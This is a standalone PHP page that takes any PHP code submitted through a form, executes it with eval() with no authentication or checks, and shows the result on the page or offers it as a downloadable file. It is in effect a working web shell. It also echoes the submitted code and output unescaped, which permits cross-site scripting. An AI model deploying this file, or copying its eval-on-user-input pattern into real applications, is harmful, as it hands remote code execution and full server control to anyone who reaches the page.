<?php
$php_output = "";
$php_input = "";
if (isset($_POST['php_input'])) {
    $php_input = $_POST['php_input'];
    ob_start();
    eval($php_input);
    $php_output = ob_get_contents();
    ob_end_clean();
    if (isset($_POST['to_file']) && $_POST['to_file'] == 'on') {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . time() . '.txt"');
        die($php_output);
    }
}
?>
<div align="center" style="margin-top:30px;">
    <form method="post">
        <div style="margin:5px 0;">Type PHP code to execute:</div>
        <textarea name="php_input" style="font-family: monospace; width: 90%; height: 400px;"><?php echo $php_input; ?></textarea><br />
        <input id="to_file" name="to_file" type="checkbox"/><label for="to_file">Output to file</label><br /><br />
        <input name="button" type="submit" value="Execute!" /><br />
        <div style="white-space: pre-wrap; font-family: monospace; text-align: left; border: 2px solid black; padding: 10px; margin-top: 10px;"><?php echo $php_output; ?></div>
    </form>
</div>
